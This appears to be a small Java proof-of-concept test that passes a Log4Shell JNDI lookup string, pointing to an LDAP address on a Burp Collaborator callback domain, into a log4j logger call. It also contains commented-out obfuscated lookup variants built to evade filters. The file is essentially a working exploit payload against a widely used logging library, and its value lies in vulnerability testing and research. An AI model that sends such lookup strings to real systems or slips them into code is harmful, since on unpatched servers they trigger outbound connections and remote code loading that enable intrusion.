import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.ThreadContext;


public class Test {
    private static final Logger logger = LogManager.getLogger(Test.class);
    public static void main(String[] args) {
        //ThreadContext.put("loginId", "${${::-${::-$${::-j}}}}");
        //ThreadContext.put("loginId", "${${-j}}}");
        logger.error("${jndi:ldap://jwjunjs72p56zohw0n6o2szkhbn2br.burpcollaborator.net}");
        //logger.error("aaaa");
    }
}
